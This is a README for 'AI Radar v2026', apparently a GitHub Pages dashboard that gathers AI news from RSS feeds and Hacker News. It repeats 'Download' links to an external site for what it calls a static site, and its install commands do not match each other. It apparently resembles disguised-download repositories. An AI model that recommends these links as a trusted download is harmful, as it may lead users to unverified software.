# AI Radar v2026 - news dashboard 2026

> **AI Radar is a GitHub Pages news dashboard for tracking AI coverage. It collects stories from RSS feeds and Hacker News, removes duplicates, and delivers updates with summaries in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victor-westjbdy2261/ai-radar-rss-hub-2026?style=flat-square)](https://github.com/victor-westjbdy2261/ai-radar-rss-hub-2026)

---

<p align="center">
  <a href="https://victor-westjbdy2261.github.io/ai-radar-rss-hub-2026/">
    <img src="https://img.shields.io/badge/Download-AI%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download AI Radar">
  </a>
</p>

> **[Download AI Radar v2026](https://victor-westjbdy2261.github.io/ai-radar-rss-hub-2026/)**

---

[Download Latest Build](https://victor-westjbdy2261.github.io/ai-radar-rss-hub-2026/)

---

## What AI Radar Does

AI Radar provides a static dashboard for following developments across the artificial intelligence industry. It collects entries from RSS publishers and Hacker News, identifies stories that cover the same event, and combines the stream into a more focused reading experience.

Because the result is designed for GitHub Pages, the project can run as a lightweight published website instead of a hosted application. Readers, analysts, and teams can use it to review current AI activity with concise summaries and available business or financial context.

---

## Highlights

- Brings together AI industry coverage from multiple sources
- Accepts story candidates from RSS feeds and Hacker News
- Supports the Algolia API for discovering and retrieving sources
- Groups or removes duplicate coverage before publication
- Provides summaries for faster review of incoming stories
- Surfaces financial themes and commercial implications when available
- Produces a static site suitable for GitHub Pages
- Offers a straightforward dashboard interface for browsing updates

---

## Installation

Download the repository and move into the project directory:

`git clone https://github.com/victor-westjbdy2261/ai-radar-rss-hub-2026.git
`cd ai-radar`

To run the dashboard locally, open the generated files from the build output or serve the project directory through any static web server. When deploying with GitHub Pages, publish the prepared site contents through the configured branch or publishing path.

---

## Using the Dashboard

1. Visit the deployed site in a web browser.
2. Browse the newest AI stories collected by the project.
3. Read the attached summaries for a quick overview.
4. Use the grouped results to reduce repeated coverage of the same event.
5. Open the source links for complete articles and additional detail.

For a local check, serve the files as static content and reload the page whenever the feed or dashboard data changes.

---

## Configuration

The project files generally contain the settings for source definitions, ranking, and publication behavior. When adding or modifying the dashboard, keep RSS source lists, Hacker News queries, and summary processing together in the relevant configuration area to make maintenance simpler.

Example structure:

{
  "sources": ["rss", "hacker-news"],
  "deduplication": true,
  "summaries": true,
  "money_angles": true
}

---

## Requirements

- GitHub Pages for deployment
- A web browser for viewing the dashboard
- Access to RSS feeds
- Access to Hacker News data
- Algolia API support for associated retrieval workflows
- Static hosting that can serve HTML output

---

## Frequently Asked Questions

**When does the dashboard refresh?**  
Refresh timing is determined by the schedule used for feed collection and the publishing workflow.

**Are the news sources configurable?**  
Yes. RSS feeds and related discovery inputs can be changed through the project configuration because the dashboard is driven by its source definitions.

**Why might a story not appear?**  
An entry can be removed during duplicate detection, or it may be filtered before publication when its coverage substantially overlaps another item.

**How are the summaries produced?**  
Summaries are created during the enrichment process that prepares collected items for display.

**What can I check if updates stop appearing?**  
Inspect the publishing workflow, make sure the static output is being generated, and verify that the GitHub Pages deployment path is configured properly.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
